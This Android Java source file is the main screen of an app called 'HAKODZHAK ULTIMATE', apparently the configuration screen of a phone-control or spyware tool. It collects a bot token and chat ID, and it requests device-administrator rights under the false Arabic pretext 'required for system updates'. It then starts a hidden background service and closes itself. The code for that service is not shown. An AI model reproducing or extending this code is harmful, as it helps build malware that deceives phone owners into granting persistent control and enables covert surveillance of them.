package com.hakodzhak.app;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(50, 50, 50, 50);

        TextView title = new TextView(this);
        title.setText("HAKODZHAK ULTIMATE");
        title.setTextSize(24);
        layout.addView(title);

        EditText tokenInput = new EditText(this);
        tokenInput.setHint("Bot Token");
        layout.addView(tokenInput);

        EditText chatIdInput = new EditText(this);
        chatIdInput.setHint("Chat ID");
        layout.addView(chatIdInput);

        Button startBtn = new Button(this);
        startBtn.setText("ACTIVATE");
        layout.addView(startBtn);

        Button settingsBtn = new Button(this);
        settingsBtn.setText("⚙️ Settings");
        layout.addView(settingsBtn);

        setContentView(layout);

        // حفظ وتشغيل
        startBtn.setOnClickListener(v -> {
            String token = tokenInput.getText().toString().trim();
            String chatId = chatIdInput.getText().toString().trim();
            if (token.isEmpty() || chatId.isEmpty()) {
                Toast.makeText(this, "أدخل البيانات", Toast.LENGTH_SHORT).show();
                return;
            }
            SharedPreferences prefs = getSharedPreferences("config", MODE_PRIVATE);
            prefs.edit().putString("botToken", token).putString("chatId", chatId).apply();

            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, MyDeviceAdmin.class);
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "مطلوب لتحديثات النظام.");
            startActivity(intent);

            startService(new Intent(this, MyService.class));
            finish();
        });

        // فتح الإعدادات
        settingsBtn.setOnClickListener(v -> {
            startActivity(new Intent(this, SettingsActivity.class));
        });
    }
}
